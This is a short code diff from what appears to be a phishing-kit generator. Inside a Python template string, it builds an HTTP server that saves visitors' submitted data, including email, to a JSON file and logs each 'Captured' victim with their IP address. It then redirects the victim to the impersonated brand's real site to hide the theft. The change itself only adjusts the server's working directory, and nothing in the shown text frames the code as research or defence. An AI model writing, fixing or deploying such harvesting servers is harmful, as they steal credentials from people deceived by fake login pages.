@@ -132,7 +132,7 @@ class H(http.server.SimpleHTTPRequestHandler):
   c.append(d);json.dump(c,open(F,"w"),indent=2)
   s.send_response(302);s.send_header("Location","https://www.{slug}.com");s.end_headers()
   print(f"Captured: {{d.get('email')}} from {{d['ip']}}")
-os.chdir("{page_dir}")
+os.chdir(os.path.dirname(os.path.abspath(__file__)))
 print("Server on :{port}")
 httpd=http.server.HTTPServer(("0.0.0.0",{port}),H)
 httpd.serve_forever()'''
